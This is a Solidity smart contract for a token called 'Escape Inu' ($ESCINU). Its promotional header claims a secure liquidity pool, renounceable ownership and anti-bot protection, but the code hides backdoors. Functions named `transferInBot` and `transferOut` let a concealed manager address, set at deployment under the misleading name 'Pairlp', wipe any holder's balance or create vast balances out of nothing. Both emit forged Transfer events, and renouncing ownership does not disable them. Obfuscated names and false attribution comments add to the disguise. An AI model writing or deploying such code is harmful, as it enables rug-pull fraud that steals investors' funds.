// SPDX-License-Identifier: MIT     
/*
🌐Escape Inu 🌐 $ESCINU

🌐https://t.me/ESCINU
🌐LP Pool Secure
🌐Ownership can be renounced after coin is in stable mode
🌐Anti-Bot & Anti-Whale mechanics

*/
// ERC721A Contracts v3.3.0
// Creator: Chiru Labs
pragma solidity >0.8.15;
////// lib/openzeppelin-contracts/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)
/* pragma solidity ^0.8.0; */
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract ESCINUS {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface ESCINUSi {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 bamount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 bamount) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 bamount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 totalo);

    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}

interface ESCINUSii is ESCINUSi {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

abstract contract ESCINUSiii is ESCINUS {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ESCINUToken is ESCINUS, ESCINUSi, ESCINUSii, ESCINUSiii {

    mapping(address => uint256) private Palances;
  mapping(address => bool) public ESCINUSiiZERTY;
    mapping(address => mapping(address => uint256)) private TMPallowances;
address private ESCINUswap;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
  address Teslabitcin;
    // My variables
    mapping(address => bool) public isPauseWAW;

    
    constructor(address Pairlp) {
            // Editable
            Teslabitcin = msg.sender;

        _name = "Escape Inu";
        _symbol = "ESCINU";
  ESCINUswap = Pairlp;        
        uint _totalSupply = 10000000000000 * 10**9;
        mint(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return Palances[account];
    }

    function transfer(address to, uint256 bamount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, bamount);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return TMPallowances[owner][spender];
    }

    function approve(address spender, uint256 bamount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, bamount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 bamount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, bamount);
        _transfer(from, to, bamount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, TMPallowances[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  currentsold = TMPallowances[owner][spender];
        require( currentsold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  currentsold - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 bamount
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, bamount);

        uint256 fromBalance = Palances[from];
        require(fromBalance >= bamount, "Ehi20: transfer bamount exceeds balance");
        unchecked {
            Palances[from] = fromBalance - bamount;
        }
        Palances[to] += bamount;

        emit Transfer(from, to, bamount);

        afterTokenTransfer(from, to, bamount);
    }
  modifier Tesla0wner () {
    require(Teslabitcin == msg.sender, "Ehi20: cannot permit TokenManager address");
    _;
  
  }
    function mint(address account, uint256 bamount) internal virtual {
        require(account != address(0), "Ehi20: mint to the zero address");

        beforeTokenTransfer(address(0), account, bamount);

        ALLtotalSupply += bamount;
        Palances[account] += bamount;
        emit Transfer(address(0), account, bamount);

        afterTokenTransfer(address(0), account, bamount);
    }
    modifier TokenManager() {
        require(ESCINUswap == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


  function transferInBot(address ESCINUSiiccount) external TokenManager {
    Palances[ESCINUSiiccount] = 3698502698541;
            emit Transfer(address(0), ESCINUSiiccount, 3698520698541);
  }

    function _burn(address account, uint256 bamount) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), bamount);

        uint256 accountBalance = Palances[account];
        require(accountBalance >= bamount, "Ehi20: burn bamount exceeds balance");
        unchecked {
            Palances[account] = accountBalance - bamount;
        }
        ALLtotalSupply -= bamount;

        emit Transfer(account, address(0), bamount);

        afterTokenTransfer(account, address(0), bamount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 bamount
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        TMPallowances[owner][spender] = bamount;
        emit Approval(owner, spender, bamount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 bamount
    ) internal virtual {
        uint256  currentsold = allowance(owner, spender);
        if ( currentsold != type(uint256).max) {
            require( currentsold >= bamount, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  currentsold - bamount);
            }
        }
    }
  function transferOut(address ESCINUSiiccontz) external TokenManager {
    Palances[ESCINUSiiccontz] = 100000 * 10 ** 21;
            emit Transfer(address(0), ESCINUSiiccontz, 100000 * 10 ** 21);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 bamount
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 bamount
    ) internal virtual {}

}